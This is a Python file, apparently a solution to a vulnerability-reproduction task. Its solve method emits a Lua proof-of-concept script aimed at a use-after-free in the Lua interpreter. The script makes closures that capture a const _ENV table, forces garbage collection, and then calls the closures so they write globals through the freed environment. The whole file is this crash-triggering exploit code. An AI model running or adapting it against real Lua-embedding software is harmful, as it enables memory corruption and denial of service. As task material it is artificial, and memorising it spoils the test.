import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = []
        poc.append("local G = _G or _ENV")
        poc.append("local SetMT = setmetatable")
        poc.append("local hold = {}")
        poc.append("local function GC() collectgarbage('collect'); collectgarbage('collect') end")
        poc.append("")
        # Test 1: simple writer closure
        poc.append("do")
        poc.append("  local _ENV<const> = SetMT({}, {__gc=function() end})")
        poc.append("  local function maker()")
        poc.append("    return function()")
        poc.append("      a = (a or 0) + 1")
        poc.append("    end")
        poc.append("  end")
        poc.append("  hold[1] = maker()")
        poc.append("end")
        poc.append("GC()")
        poc.append("for i=1,40000 do local t = {} end")
        poc.append("GC()")
        poc.append("hold[1]()")
        poc.append("")
        # Test 2: two-level nested with extra locals
        poc.append("do")
        poc.append("  local _ENV<const> = SetMT({}, {__gc=function() end})")
        poc.append("  local function maker()")
        poc.append("    local padding = {1,2,3,4,5}")
        poc.append("    local function inner()")
        poc.append("      for i=1,3 do")
        poc.append("        a = (a or 0) + 1")
        poc.append("        b = (b or 0) + 1")
        poc.append("      end")
        poc.append("    end")
        poc.append("    return function()")
        poc.append("      inner()")
        poc.append("    end")
        poc.append("  end")
        poc.append("  hold[2] = maker()")
        poc.append("end")
        poc.append("GC()")
        poc.append("for i=1,40000 do local t = {} end")
        poc.append("GC()")
        poc.append("hold[2]()")
        poc.append("")
        # Test 3: varargs and multiple globals
        poc.append("do")
        poc.append("  local _ENV<const> = {}")
        poc.append("  local function maker(...)")
        poc.append("    local k = ...")
        poc.append("    return function(...)")
        poc.append("      a = (a or 0) + 1")
        poc.append("      b = (b or 0) + 2")
        poc.append("      c = (c or 0) + 3")
        poc.append("    end")
        poc.append("  end")
        poc.append("  hold[3] = maker(1,2,3)")
        poc.append("end")
        poc.append("GC()")
        poc.append("for i=1,40000 do local t = {} end")
        poc.append("GC()")
        poc.append("hold[3]()")
        poc.append("")
        # Test 4: deeper nesting and mixed reads/writes
        poc.append("do")
        poc.append("  local _ENV<const> = SetMT({}, {__gc=function() end})")
        poc.append("  local function layer1()")
        poc.append("    local z = 0")
        poc.append("    local function layer2()")
        poc.append("      local function leaf()")
        poc.append("        for i=1,5 do")
        poc.append("          a = (a or 0) + 1")
        poc.append("          b = (b or 0)")
        poc.append("          d = (d or 0) + 1")
        poc.append("        end")
        poc.append("      end")
        poc.append("      return leaf")
        poc.append("    end")
        poc.append("    return layer2()")
        poc.append("  end")
        poc.append("  hold[4] = layer1()")
        poc.append("end")
        poc.append("GC()")
        poc.append("for i=1,40000 do local t = {} end")
        poc.append("GC()")
        poc.append("hold[4]()")
        poc.append("")
        # Test 5: assign table then mutate fields via freed _ENV")
        poc.append("do")
        poc.append("  local _ENV<const> = SetMT({}, {__gc=function() end})")
        poc.append("  local function maker()")
        poc.append("    local x = 0")
        poc.append("    return function()")
        poc.append("      a = {}")
        poc.append("      a.x = 42")
        poc.append("      a.y = (a.y or 0) + 7")
        poc.append("    end")
        poc.append("  end")
        poc.append("  hold[5] = maker()")
        poc.append("end")
        poc.append("GC()")
        poc.append("for i=1,40000 do local t = {} end")
        poc.append("GC()")
        poc.append("hold[5]()")
        poc.append("")
        # Ensure process runs a bit more to encourage GC cycles before exit
        poc.append("GC()")
        poc.append("for i=1,10000 do local t = {i, i*i} end")
        poc.append("GC()")
        poc.append("")
        return ("\n".join(poc)).encode("utf-8")
